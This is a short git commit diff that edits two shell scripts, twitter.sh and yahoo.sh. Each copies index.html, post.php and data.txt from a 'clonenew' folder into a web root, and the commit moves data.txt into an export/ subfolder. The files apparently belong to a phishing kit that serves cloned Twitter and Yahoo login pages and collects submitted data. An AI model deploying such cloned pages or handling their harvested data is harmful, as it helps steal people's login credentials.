ab9595e3286e3efe27c3677001cb7f92795a2e6f
mak <makindosx@gmail.com>
2017-06-17 23:24:59 +0300

    Add files via upload

--- shell/twitter.sh
+++ shell/twitter.sh
@@ -1,3 +1,3 @@
 cp -avr /var/www/clonenew/twitter/index.html /var/www/clonenew/
 cp -avr /var/www/clonenew/twitter/post.php /var/www/clonenew/
-cp -avr /var/www/clonenew/twitter/data.txt /var/www/clonenew/
+cp -avr /var/www/clonenew/twitter/data.txt /var/www/clonenew/export/
--- shell/yahoo.sh
+++ shell/yahoo.sh
@@ -1,3 +1,3 @@
 cp -avr /var/www/clonenew/yahoo/index.html /var/www/clonenew/
 cp -avr /var/www/clonenew/yahoo/post.php /var/www/clonenew/
-cp -avr /var/www/clonenew/yahoo/data.txt /var/www/clonenew/
+cp -avr /var/www/clonenew/yahoo/data.txt /var/www/clonenew/export/
